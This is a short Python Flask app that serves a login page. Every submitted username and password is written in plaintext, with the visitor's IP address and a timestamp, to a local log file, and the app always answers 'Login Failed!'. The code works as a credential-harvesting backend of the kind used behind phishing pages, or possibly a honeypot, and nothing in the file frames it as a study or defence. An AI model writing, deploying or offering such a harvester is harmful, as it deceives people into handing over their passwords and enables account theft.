from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    ip = request.remote_addr

    with open("web_logs.txt", "a") as f:
        f.write(f"{datetime.now()} | IP: {ip} | USER: {username} | PASS: {password}\n")

    return "Login Failed!"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
